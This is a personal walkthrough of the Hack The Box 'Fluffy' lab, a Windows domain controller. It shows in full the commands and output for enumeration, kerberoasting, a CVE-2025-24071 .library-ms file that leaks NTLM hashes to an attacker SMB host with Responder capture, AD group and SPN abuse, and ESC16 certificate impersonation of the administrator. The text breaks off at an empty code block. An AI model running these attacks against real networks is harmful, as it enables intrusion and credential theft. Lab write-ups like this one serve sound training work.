# Fluffy Machine

## Offensive Perspective - Fluffy Machine solve thought process

**`How I exploited the machine step-by-step`**
### Initial Access / Provided Credentials

We already have been given this credentials
`As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!`

Let's add it to our secrets table
### NMAP - Recon

Okay let's check what nmap gives about in detail line by line
```bash
┌──(teja㉿x50ubr)-[~/…/HTB/Machines/Retired/Fluffy]
└─$ nmap -sC -sV -oN nmap.results 10.10.11.69
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-25 15:30 IST
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.50% done
Stats: 0:01:21 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.93% done; ETC: 15:31 (0:00:00 remaining)
Nmap scan report for 10.10.11.69
Host is up (0.23s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-25 16:58:41Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-12-25T17:00:07+00:00; +6h57m57s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-12-25T17:00:05+00:00; +6h57m58s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-12-25T17:00:05+00:00; +6h57m58s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-12-25T17:00:05+00:00; +6h57m58s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h57m57s, deviation: 0s, median: 6h57m57s
| smb2-time: 
|   date: 2025-12-25T16:59:26
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.73 seconds
```

### Domain Controller Analysis

First let's check if this Domain Controller or domain joined windows server .
We see 
- Port 88 - Kerberos
- Port 389 - LDAP
- Port 3268 - LDAP Global Catalog

Since we see Port 3268 also , this is confirm Domain Controller Machine . Why because 3268 proves is a domain controller because , only domain controller have information about all the domains in a forest of AD . 
Global Catalog DC will have replicas of all domains their objects , users , computers all . 
If you have multiple domains configured in AD , the DC will have Global Catalog service to authenticate users from various domains 

Sometimes DCs don't have Global Catalog because it has to replicate forest wide or multiple domain wide changes which will take up huge bandwidth and resources . So at that time you can confirm if it DC or not by looking at kerberos , kerberos + ldap , and sometime SMB enabled with NETLOGON and SYSVOL shares enabled 

We see host names **`DC01.fluffy.htb`** and **`fluffy.htb`** . Let's add it to etc host files 

### Credential Validation - SMB Authentication

And let's check if our creds are valid by validating to SMB . Why SMB ? Because every account needs access to SYSVOL . Because SYSVOL share has policies which are applied to users and computers on how they can operate within a domain 

Okay we got validated with NTLM and no kerberos because I didn't give any kerberos switch with crackmapexec
```bash
┌──(teja㉿x50ubr)-[~/…/HTB/Machines/Retired/Fluffy]
└─$ crackmapexec smb 10.10.11.69 -u 'j.fleischman'  -p 'J0elTHEM4n1990!'
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
```

And we can see this is a **`Windows 10 Server 2019 Build 17763`** 
We see SMB signing ON , so no MITM attacks like that . And SMBv1 is disabled .

### LDAP Enumeration - Domain Dump

And now we dump files by querying ldap 
```bash
┌──(teja㉿x50ubr)-[~/…/HTB/Machines/Retired/Fluffy]
└─$ ldapdomaindump -u fluffy.htb\\j.fleischman -p 'J0elTHEM4n1990!' 10.10.11.69 
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

And this dumped lot of files , 
```bash
┌──(teja㉿x50ubr)-[~/…/HTB/Machines/Retired/Fluffy]
└─$ ls domain*
domain_computers_by_os.html  domain_groups.html  domain_trusts.grep          domain_users.html
domain_computers.grep        domain_groups.json  domain_trusts.html          domain_users.json
domain_computers.html        domain_policy.grep  domain_trusts.json
domain_computers.json        domain_policy.html  domain_users_by_group.html
domain_groups.grep           domain_policy.json  domain_users.grep       
```

Let's read domain users to check who do we have 
```bash
┌──(teja㉿x50ubr)-[~/…/Machines/Retired/Fluffy/ldapDump]
└─$ cat domain_users.json | jq '.[] | .attributes | .sAMAccountName[0]'
"j.fleischman"
"j.coffey"
"winrm_svc"
"p.agila"
"ldap_svc"
"ca_svc"
"krbtgt"
"Guest"
"Administrator"
```

And these many groups 
```bash
┌──(teja㉿x50ubr)-[~/…/Machines/Retired/Fluffy/ldapDump]
└─$ cat domain_groups.json | jq '.[] | .attributes | .sAMAccountName[0]'
"Service Accounts"
"Service Account Managers"
"DnsUpdateProxy"
"DnsAdmins"
"Enterprise Key Admins"
"Key Admins"
"Protected Users"
"Cloneable Domain Controllers"
"Enterprise Read-only Domain Controllers"
"Read-only Domain Controllers"
"Denied RODC Password Replication Group"
"Allowed RODC Password Replication Group"
"Terminal Server License Servers"
"Windows Authorization Access Group"
"Incoming Forest Trust Builders"
"Pre-Windows 2000 Compatible Access"
"Account Operators"
"Server Operators"
"RAS and IAS Servers"
"Group Policy Creator Owners"
"Domain Guests"
"Domain Users"
"Domain Admins"
"Cert Publishers"
"Enterprise Admins"
"Schema Admins"
"Domain Controllers"
"Domain Computers"
"Storage Replica Administrators"
"Remote Management Users"
"Access Control Assistance Operators"
"Hyper-V Administrators"
"RDS Management Servers"
"RDS Endpoint Servers"
"RDS Remote Access Servers"
"Certificate Service DCOM Access"
"Event Log Readers"
"Cryptographic Operators"
"IIS_IUSRS"
"Distributed COM Users"
"Performance Log Users"
"Performance Monitor Users"
"Network Configuration Operators"
"Remote Desktop Users"
"Replicator"
"Backup Operators"
"Print Operators"
"Guests"
"Users"
"Administrators"
```

### BloodHound Enumeration

Now let's run rusthound to see what we got . . . 
Dumped files and now running bloodhound to load those files and see what we can do 

Let's see the existing queries . . . 
1. All Domain Admins 
	1. Administrator -- MemberOf -- Domain Admins
2. Shortest Path to Domain Users 
3. All Kerberostable Users
	1. LDAP_SVC
	2. WINRM_SVC
	3. CA_SVC

And we have no users for AS-REP Rostable Users 

Our user **`j.fleischman`** has 4 outbound object controls all of them are Enroll Privileges  to Certificate, none of them are useful at the moment 

![[Pasted image 20251226100210.png]]
![[Pasted image 20251226100302.png]]

If you see we have authentication enabled - DONE
We have effective SKUs which are interesting - DONE 
Buf if you see ENROLLEE SUPPLIES SUBJECT - NOPE

So enroll privilege is using certificates and requesting certificates for access . So the above 3 terms means , if you have
- Authentication Enabled - You can use certificate instead of password for authentication
- Effective SKUs - These say where you can use these certificates
- Enrollee Supplies Subject , if True you can use these certificates impersonating other users with powers you have from the Effective SKUs

The above SKUs' say we have these powers 
- 1.3.6.1.4.1.311.10.3.4 - This is Encrypting File System , so users can encrypt their files 
- 1.3.6.1.5.5.7.3.4 - This is for sending encrypted and signed mails 
- 1.3.6.1.5.5.7.3.2 - This is effective and useful which is Client Authentication . This certificate proves who you are to the servers . Proving your identity to servers

So all 3 must be useful to use this path as vector for attack . . . 
But this is not useful now because we don't have enrolle suppliers subject true , so let's look at kerberostable users . 
- LDAP_SVC
- WINRM_SVC
- CA_SVC

Let's use impacket tool GetUserSPNs tool to retrieve all tickets .
```bash
┌──(teja㉿x50ubr)-[~/…/HTB/Machines/Retired/Fluffy]
└─$ impacket-GetUserSPNs fluffy.htb/j.fleischman:J0elTHEM4n1990! -dc-ip 10.10.11.69 -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name       MemberOf                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ---------  ---------------------------------------------  --------------------------  --------------------------  ----------
ADCS/ca.fluffy.htb      ca_svc     CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 21:37:50.136701  2025-05-22 03:51:15.969274             
LDAP/ldap.fluffy.htb    ldap_svc   CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 21:47:00.599545  <never>                                
WINRM/winrm.fluffy.htb  winrm_svc  CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-05-18 06:21:16.786913  2025-05-19 20:43:22.188468             



[-] CCache file is not found. Skipping...
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

There is time skew error , which is because our local time is not synced with DC , that's why the time difference is causing kerberos to reject our request and we also need CCache file which is TGT file is missing for our account before requesting TGS or Service tickets for above listed 3 services . 

Let's do that first .
Updated time with **`sudo ntpdate $IP`** . 

### Kerberos Enumeration – Kerberoast Candidates

And dumped hashes and using hashcat to crack 
```bash
┌──(teja㉿x50ubr)-[~/…/Retired/Fluffy/TGTs/tmp]
└─$ impacket-GetUserSPNs fluffy.htb/j.fleischman:J0elTHEM4n1990! -dc-ip 10.10.11.69 -request -outputfile tgsTickets
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name       MemberOf                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ---------  ---------------------------------------------  --------------------------  --------------------------  ----------
ADCS/ca.fluffy.htb      ca_svc     CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 21:37:50.136701  2025-05-22 03:51:15.969274             
LDAP/ldap.fluffy.htb    ldap_svc   CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 21:47:00.599545  <never>                                
WINRM/winrm.fluffy.htb  winrm_svc  CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-05-18 06:21:16.786913  2025-05-19 20:43:22.188468             

[-] CCache file is not found. Skipping...

┌──(teja㉿x50ubr)-[~/…/Retired/Fluffy/TGTs/tmp]
└─$ ls
tgsTickets
```

Nope , couldn't crack any of the hash . Let's look at this AD CS , the certificate thing one more time. . .   

NOPE NOPE . This proved to be dead end  .

### SMB Share Enumeration – Initial Foothold Vector

Finally ruled this out and we should have started with SMB share enum which is the first thing to do . I did all of this , but learnt a lot lot lot by doing recon all of that . Learned more AD than ever I could say

Enumerated shares
```bash
┌──(teja㉿x50ubr)-[~/…/HTB/Machines/Retired/Fluffy]
└─$ crackmapexec smb 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         10.10.11.69     445    DC01             [+] Enumerated shares
SMB         10.10.11.69     445    DC01             Share           Permissions     Remark
SMB         10.10.11.69     445    DC01             -----           -----------     ------
SMB         10.10.11.69     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.69     445    DC01             C$                              Default share
SMB         10.10.11.69     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.69     445    DC01             IT              READ,WRITE      
SMB         10.10.11.69     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.69     445    DC01             SYSVOL          READ            Logon server share 
```

We have write to IT share 
And I've dumped contents of IT share and there is a PDF which says to update systems which are vulnerable to multiple HIGH and CRITICAL ranking CVEs

![[Pasted image 20251226185813.png]]

![[Pasted image 20251226185841.png]]

Let's look at those CVEs 
So after research , the CVE-2025-24071 is actually vulnerable . . . 

### Exploitation – CVE-2025-24071 NTLM Hash Leak via .library-ms

This CVE exploit authentication , when a zip folder with **`.library-ms`** file is opened or previewed when unzipped , it sends their NTLM authentication hashes to SMB server . 
This file is a XML file which has instructions to looks for files and folders to windows explorer . So when you unzip a folder ,  windows unzip folder with all files in it and the XML instruction file which points to a remote SMB server so it can gather files from there . . . 

So what happens is , when it contact evil SMB server , is shares the credentials and that's how we exploited this and got credentials

```bash
┌──(teja㉿x50ubr)-[~/…/HTB/Machines/Retired/Fluffy]
└─$ cat patch.library-ms 
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.31\shared</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>          

smb: \> put patch.zip
putting file patch.zip as \patch.zip (0.4 kB/s) (average 0.4 kB/s)

┌──(teja㉿x50ubr)-[~/…/HTB/Machines/Retired/Fluffy]
└─$ sudo responder -I tun0
[+] Servers:
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
                                         __
[+] Listening for events...                                                                                                   

[!] Error starting TCP server on port 3389, check permissions or other servers running.
[SMB] NTLMv2-SSP Client   : 10.10.11.69
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:4ed377d8ceaa68cf:AAB1FE12A8A90F18AAA5F1F72F33E2EA:010100000000000000B27D3E9276DC01EC75246AB96F8A420000000002000800460051003600590001001E00570049004E002D003800320056004600360036004F00320059005A004E0004003400570049004E002D003800320056004600360036004F00320059005A004E002E0046005100360059002E004C004F00430041004C000300140046005100360059002E004C004F00430041004C000500140046005100360059002E004C004F00430041004C000700080000B27D3E9276DC0106000400020000000800300030000000000000000100000000200000181DD36A09BEF6EFFB40574DDF22D157817BC5804484C3F5734EA6CFA89958A50A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00330031000000000000000000                                  
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
```

And why this attack worked because , the PDF we saw earlier is talking about patch management to all those vulnerable CVEs . Asking IT Admins to perform patch management and instructions 
And we have write access to IT Share , and there must be a schedule task running to unzip the file and preview it which got us credentials

### Credential Access – Cracked NTLM Hashes

Now we crack these hashes
```bash
┌──(teja㉿x50ubr)-[~/…/HTB/Machines/Retired/Fluffy]
└─$ hashcat -m 5600 hashDumped ~/Tools/seclists/rockyou.txt --show 
P.AGILA::FLUFFY:4ed377d8ceaa68cf:aab1fe12a8a90f18aaa5f1f72f33e2ea:010100000000000000b27d3e9276dc01ec75246ab96f8a420000000002000800460051003600590001001e00570049004e002d003800320056004600360036004f00320059005a004e0004003400570049004e002d003800320056004600360036004f00320059005a004e002e0046005100360059002e004c004f00430041004c000300140046005100360059002e004c004f00430041004c000500140046005100360059002e004c004f00430041004c000700080000b27d3e9276dc0106000400020000000800300030000000000000000100000000200000181dd36a09bef6effb40574ddf22d157817bc5804484c3f5734ea6cfa89958a50a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00330031000000000000000000:prometheusx-303
```

Now we add this to our secrets **`prometheusx-303`** and user **`p.agila`** . 
Let's check in bloodhound again what this new user has . . . 

So this user p.agila has generic write to all the 3 services
- winRM_SVC
- LDAP_SVC
- CA_SVC

### Privilege Escalation Path Discovery – GenericWrite Abuse

What is generic write ? It allows us to change properties of the services . 
So now the question is which of these 3 services are better path for a privesc ?

CA_SVC looks promising , we have generic write , so we want to check if we can add shadow credentials . 
Shadow credentials are adding extra set of authentication method where we add keys/certificates for authentication . We add keys , public key is with AD DC and private key is with us and we provide this to prove identity . 

So we are adding this , but before that we have to do some checks to see if this is possible
```bash
┌──(teja㉿x50ubr)-[~/…/HTB/Machines/Retired/Fluffy]
└─$ bloodyAD --host 10.10.11.69 -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' get object ca_svc > caAD

┌──(teja㉿x50ubr)-[~/…/HTB/Machines/Retired/Fluffy]
└─$ cat caAD| grep object
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=fluffy,DC=htb
objectClass: top; person; organizationalPerson; user
objectGUID: a6c41e1b-48de-49c8-8dfc-cec690e6430c
objectSid: S-1-5-21-497550768-2797716248-2627064577-1603
                                                 
┌──(teja㉿x50ubr)-[~/…/HTB/Machines/Retired/Fluffy]
└─$ cat caAD| grep admin 
                                              
┌──(teja㉿x50ubr)-[~/…/HTB/Machines/Retired/Fluffy]
└─$ cat caAD| grep -i admin
                                              
┌──(teja㉿x50ubr)-[~/…/HTB/Machines/Retired/Fluffy]
└─$ cat caAD| grep -i protected
```

And we check if this is user object , which it is .
And we check if this is an admin account  or was an admin account . Because admin or higher priv account have adminSDHolder flag set which resets ACL every 60 minutes or periodically . So even if we add shadow credentials they get wiped off as there is a process running which resets ACL to original controls
And we check if we are belonging to protected group as they don't allow PKI or this certificate validation .

### Attempted Privilege Escalation – Shadow Credentials (Failed)

So now everything is set , let's create some shadow credentials 

Okay this is failing , 
```bash
└─$ bloodyAD -u 'p.agila' -p 'prometheusx-303' --dc-ip 10.10.11.69 add shadowCredentials ca_svc
[+] KeyCredential generated with following sha256 of RSA key: 0f18d3648fd91e45efa9ec3f26732adfe860575e3c99d9d33b783397dde85d0c
Traceback (most recent call last):
  File "/usr/bin/bloodyAD", line 8, in <module>
    sys.exit(main())
             ~~~~^^
  File "/usr/lib/python3/dist-packages/bloodyAD/main.py", line 201, in main
    output = args.func(conn, **params)
  File "/usr/lib/python3/dist-packages/bloodyAD/cli_modules/add.py", line 328, in shadowCredentials
    conn.ldap.bloodymodify(
    ~~~~~~~~~~~~~~~~~~~~~~^
        target_dn,
        ^^^^^^^^^^
        {"msDS-KeyCredentialLink": [(Change.ADD.value, str(key_dnbinary))]},
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    )
    ^
  File "/usr/lib/python3/dist-packages/bloodyAD/network/ldap.py", line 285, in bloodymodify
    raise err
msldap.commons.exceptions.LDAPModifyException: LDAP Modify operation failed on DN CN=certificate authority service,CN=Users,DC=fluffy,DC=htb! Result code: "insufficientAccessRights" Reason: "b'00002098: SecErr: DSID-031514A0, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0\n\x00'"                   
```

Even though we were group member of Service Account Managers which has Generic All on Service Accounts group which has GenericWrite on ca_svc 
Why is this failing ? Because the TGT created at logon session doesn't include the group membership or Group SIDs of the above mentioned groups even though bloodhound shows it .

These groups got added after logon , by that time TGT created doesn't include these group SIDs which are getting failed for bloodyAD . . . 

### Alternative Abuse Attempts – Password Reset & SPN Manipulation

So the next option I've tried is to reset password , 
```bash
┌──(teja㉿x50ubr)-[~/…/HTB/Machines/Retired/Fluffy]
└─$ bloodyAD -u 'p.agila' -p 'prometheusx-303' --dc-ip 10.10.11.69 set password ca_svc 'haha123'
Traceback (most recent call last):
  File "/usr/bin/bloodyAD", line 8, in <module>
    sys.exit(main())
             ~~~~^^
  File "/usr/lib/python3/dist-packages/bloodyAD/main.py", line 201, in main
    output = args.func(conn, **params)
  File "/usr/lib/python3/dist-packages/bloodyAD/cli_modules/set.py", line 241, in password
    raise e
  File "/usr/lib/python3/dist-packages/bloodyAD/cli_modules/set.py", line 86, in password
    conn.ldap.bloodymodify(target, {"unicodePwd": op_list})
    ~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/bloodyAD/network/ldap.py", line 285, in bloodymodify
    raise err
msldap.commons.exceptions.LDAPModifyException: Password can't be changed. It may be because the oldpass provided is not valid.                                                                                    
You can try to use another password change protocol such as smbpasswd, server error may be more explicit.
```

As you can see , no luck . Next I've tried to add fakeSPN so that I can request TGS and crack CA_SVC password offline 
```bash
┌──(teja㉿x50ubr)-[~/…/HTB/Machines/Retired/Fluffy]
└─$ bloodyAD -u 'p.agila' -p 'prometheusx-303' --dc-ip 10.10.11.69 set object ca_svc servicePrincipalName
Traceback (most recent call last):
  File "/usr/bin/bloodyAD", line 8, in <module>
    sys.exit(main())
             ~~~~^^
  File "/usr/lib/python3/dist-packages/bloodyAD/main.py", line 201, in main
    output = args.func(conn, **params)
  File "/usr/lib/python3/dist-packages/bloodyAD/cli_modules/set.py", line 26, in object
    conn.ldap.bloodymodify(
    ~~~~~~~~~~~~~~~~~~~~~~^
        target, {attribute: [(Change.REPLACE.value, v)]}, encode=(not raw)
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    )
    ^
  File "/usr/lib/python3/dist-packages/bloodyAD/network/ldap.py", line 285, in bloodymodify
    raise err
msldap.commons.exceptions.LDAPModifyException: LDAP Modify operation failed on DN CN=certificate authority service,CN=Users,DC=fluffy,DC=htb! Result code: "insufficientAccessRights" Reason: "b'00002098: SecErr: DSID-031514A0, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0\n\x00'" 
```

### Kerberoasting via Fake SPNs

But this failed too . Next I've tried if we can add members to "Service Accounts" group and checked to add **p.agila** to the group and it worked . I was able to add to that group

```bash
┌──(teja㉿x50ubr)-[~/…/HTB/Machines/Retired/Fluffy]
└─$ bloodyAD -u 'p.agila' -p 'prometheusx-303' --dc-ip 10.10.11.69 add groupMember "Service Accounts" p.agila
[+] p.agila added to Service Accounts

```

Now let's see if we can reset password for **winrm_svc**. Nope that failed

I've tried adding fakeSPN to winrm_svc , this time it succedeed because there might be a cleanup script which is removing the group we added causing issues to add SPN.

```bash
──(teja㉿x50ubr)-[~/…/HTB/Machines/Retired/Fluffy]
└─$ bloodyAD -u 'p.agila' -p 'prometheusx-303' --dc-ip 10.10.11.69 add groupMember "Service Accounts" p.agila
[+] p.agila added to Service Accounts
                         
┌──(teja㉿x50ubr)-[~/…/HTB/Machines/Retired/Fluffy]
└─$ bloodyAD -u 'p.agila' -p 'prometheusx-303' --dc-ip 10.10.11.69 set object winrm_svc servicePrincipalName -v 'http/fakeWinRmSPN'
[+] winrm_svc's servicePrincipalName has been updated

┌──(teja㉿x50ubr)-[~/…/HTB/Machines/Retired/Fluffy]
└─$ bloodyAD -u 'p.agila' -p 'prometheusx-303' --dc-ip 10.10.11.69 set object ca_svc servicePrincipalName -v 'http/fakeSVCSPN'   
[+] ca_svc's servicePrincipalName has been updated

┌──(teja㉿x50ubr)-[~/…/HTB/Machines/Retired/Fluffy]
└─$ bloodyAD -u 'p.agila' -p 'prometheusx-303' --dc-ip 10.10.11.69 set object ldap_svc servicePrincipalName -v 'http/fakeLdapSPN'
[+] ldap_svc's servicePrincipalName has been updated
```

Now let's dump these TGS and crack them offline ,
```bash
┌──(teja㉿x50ubr)-[~/…/HTB/Machines/Retired/Fluffy]
└─$ targetedKerberoast.py -v -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' --request-user 'winrm_svc' -o winrmHash
[*] Starting kerberoast attacks
[*] Attacking user (winrm_svc)
[+] Writing hash to file for (winrm_svc)
                                              
┌──(teja㉿x50ubr)-[~/…/HTB/Machines/Retired/Fluffy]
└─$ targetedKerberoast.py -v -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' --request-user 'ldap_svc' -o ldapHash 
[*] Starting kerberoast attacks
[*] Attacking user (ldap_svc)
[+] Writing hash to file for (ldap_svc)
                                              
┌──(teja㉿x50ubr)-[~/…/HTB/Machines/Retired/Fluffy]
└─$ targetedKerberoast.py -v -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' --request-user 'ca_svc' -o caHash  
[*] Starting kerberoast attacks
[*] Attacking user (ca_svc)
[+] Writing hash to file for (ca_svc)
```

It's cracking time huhh . . . 
None of them were cracked by hashcat . . . 

### AD CS Enumeration – Certificate Templates & Misconfigurations

Let's see what we can do this account using ceripy , any weak certificates or something

This shows which templates are available for exploit
```bash
┌──(teja㉿x50ubr)-[~/…/Machines/Retired/Fluffy/certipy]
└─$ cat 20251227190023_Certipy.json | jq '."Certificate Templates"[] | select(."Client Authentication"==true) | select(."Enrollee Supplies Subject"==true)'

┌──(teja㉿x50ubr)-[~/…/HTB/Machines/Retired/Fluffy]
└─$ cat templatesEnum | grep -v false
"CrossCA" true true
"OfflineRouter" true true
"SubCA" true true
"CA" true true
```

The above 4 has Client Authentication True and Enrolle Supplies Subject True which can be used to abuse certificate authentication

Now we have to check which powers do these 4 templates have . 
Out of these 4 , **Offline Router** Template has
- Client Authentication EKU ( Extended Key Usage )

That was a dead end , i was able to now get keys , certificate authentication after adding member to the group again and try

Now we get NT hash for
- ca_svc - ca0f4f9e9eb8a092addf53bb03fc98c8
- winrm_svc - 33bd09dcd697600edf6b3a7af4875767
- ldap_svc - 22151d74ba3de931a352cba1f9393a37

Now we can use this hashes to run certipy and see vulnerable certificates or templates

### Privilege Escalation – ESC16 Certificate Abuse

And I ran certipy again to list vulnerabilities and looks it is vulnerable to ESC16 attack
```bash
┌──(teja㉿x50ubr)-[~/…/Machines/Retired/Fluffy/certipyVulnerable]
└─$ certipy-ad find -u 'ca_svc' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -vulnerable
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Wrote text output to '20251228014905_Certipy.txt'
[*] Saving JSON output to '20251228014905_Certipy.json'
[*] Wrote JSON output to '20251228014905_Certipy.json'

┌──(teja㉿x50ubr)-[~/…/Machines/Retired/Fluffy/certipyVulnerable]
└─$ cat 20251228014905_Certipy.txt 
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
```

SO ESC16 is an attack where you can request certificate for an account X and change the properties later such that it is mapped to Account Y . The requested certificate is mapped to account Y with this update done by attacker . So when you later submit , you can authenticate as account Y or user Y . This is an bug which allows impersonating others

Now what we have to do it , update the said property which is userPrincipalName to administrator account , then request the certificate and use this certificate to login as administrator 

```bash
┌──(teja㉿x50ubr)-[~/…/Machines/Retired/Fluffy/tmp]
└─$ certipy-ad account -user ca_svc -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -upn administrator -dc-ip 10.10.11.69 update
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```

Now we request certificate as administrator
```bash
┌──(teja㉿x50ubr)-[~/…/Machines/Retired/Fluffy/tmp]
└─$ certipy-ad req -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -ca FLUFFY-DC01-CA -template User -upn administrator -dc-ip 10.10.11.69
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 15
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

And then use it 
```bash
┌──(teja㉿x50ubr)-[~/…/Machines/Retired/Fluffy/tmp]
└─$ certipy-ad auth -dc-ip 10.10.11.69 -pfx administrator.pfx -username administrator -domain fluffy.htb
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[-] Name mismatch between certificate and user 'administrator'
[-] Verify that the username 'administrator' matches the certificate UPN: administrator
[-] See the wiki for more information
```

But this didn't work because there is already an administrator account , and we used this certificate to map administrator account , so this is duplicate and windows didn't know which one to use . So we unset this , and use again 

```bash
┌──(teja㉿x50ubr)-[~/…/Machines/Retired/Fluffy/tmp]
└─$ certipy-ad account -user ca_svc -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -upn ca_svc -dc-ip 10.10.11.69 update       
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc
[*] Successfully updated 'ca_svc'
```

### Domain Admin Access – Pass-the-Hash via Evil-WinRM

And now we authenticate ,

```bash
